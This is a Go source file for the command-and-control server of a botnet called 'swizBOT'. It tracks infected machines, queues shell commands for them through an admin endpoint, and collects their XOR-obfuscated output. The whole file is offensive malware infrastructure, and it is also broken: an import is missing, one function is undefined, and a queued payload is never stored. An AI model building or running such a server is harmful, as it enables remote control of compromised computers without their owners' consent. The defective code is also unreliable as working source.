package main

import (
    "encoding/json"
    "fmt"
    "net/http"
    "sync"
    "time"
    "github.com/gorilla/websocket"
)

type Bot struct {
    ID        string    `json:"id"`
    IP        string    `json:"ip"`
    OS        string    `json:"os"`
    Arch      string    `json:"arch"`
    LastSeen  time.Time `json:"last_seen"`
    Command   string    `json:"command,omitempty"`
}

type C2Server struct {
    bots      map[string]*Bot
    mutex     sync.RWMutex
    upgrader  websocket.Upgrader
}

func NewC2Server() *C2Server {
    return &C2Server{
        bots: make(map[string]*Bot),
        upgrader: websocket.Upgrader{
            CheckOrigin: func(r *http.Request) bool { return true },
        },
    }
}

func (s *C2Server) checkinHandler(w http.ResponseWriter, r *http.Request) {
    botID := r.URL.Query().Get("bot_id")
    os := r.URL.Query().Get("os")
    arch := r.URL.Query().Get("arch")
    
    s.mutex.Lock()
    defer s.mutex.Unlock()
    
    bot, exists := s.bots[botID]
    if !exists {
        bot = &Bot{
            ID:       botID,
            IP:       r.RemoteAddr,
            OS:       os,
            Arch:     arch,
        }
        s.bots[botID] = bot
        fmt.Printf("[+] New bot registered: %s (%s/%s)\n", botID, os, arch)
    }
    
    bot.LastSeen = time.Now()
    
    // Check if there's a pending command
    w.Header().Set("Content-Type", "application/json")
    json.NewEncoder(w).Encode(map[string]string{
        "id":      fmt.Sprintf("cmd_%d", time.Now().Unix()),
        "type":    bot.Command,
        "payload": getCommandPayload(bot.Command),
    })
}

func (s *C2Server) resultHandler(w http.ResponseWriter, r *http.Request) {
    // Decrypt XOR payload
    body, _ := io.ReadAll(r.Body)
    for i := range body {
        body[i] ^= 0xAA // XOR key matches client
    }
    
    var resp map[string]interface{}
    json.Unmarshal(body, &resp)
    
    fmt.Printf("[+] Result from %s: %s\n", resp["bot_id"], resp["output"])
}

func (s *C2Server) commandHandler(w http.ResponseWriter, r *http.Request) {
    // Admin endpoint: /command?bot_id=xxx&cmd=exec&payload=whoami
    botID := r.URL.Query().Get("bot_id")
    cmdType := r.URL.Query().Get("cmd")
    payload := r.URL.Query().Get("payload")
    
    s.mutex.Lock()
    defer s.mutex.Unlock()
    
    if bot, exists := s.bots[botID]; exists {
        bot.Command = cmdType
        fmt.Printf("[+] Command sent to %s: %s %s\n", botID, cmdType, payload)
    }
}

func (s *C2Server) listHandler(w http.ResponseWriter, r *http.Request) {
    s.mutex.RLock()
    defer s.mutex.RUnlock()
    
    bots := make([]Bot, 0, len(s.bots))
    for _, b := range s.bots {
        bots = append(bots, *b)
    }
    
    json.NewEncoder(w).Encode(bots)
}

func main() {
    server := NewC2Server()
    
    http.HandleFunc("/checkin", server.checkinHandler)
    http.HandleFunc("/result", server.resultHandler)
    http.HandleFunc("/command", server.commandHandler)
    http.HandleFunc("/list", server.listHandler)
    
    fmt.Println("[+] swizBOT C2 Server running on :8443")
    http.ListenAndServeTLS(":8443", "server.crt", "server.key", nil)
}
